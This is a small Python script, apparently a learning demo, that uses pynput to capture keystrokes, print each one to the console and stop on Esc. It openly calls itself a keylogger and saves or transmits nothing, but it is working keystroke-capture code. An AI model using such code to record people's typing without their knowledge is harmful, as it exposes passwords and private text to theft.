from pynput import keyboard

def on_press(key):
    try:
        print (f"key pressed: {key.char}")
    except AttributeError:
        print(f"special key pressed: {key}")

def on_release(key):
    if key == keyboard.Key.esc:
        print("Exiting keylogger...")
        return False
    
print("keylogger started")
print("Press Esc to stop\n")

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()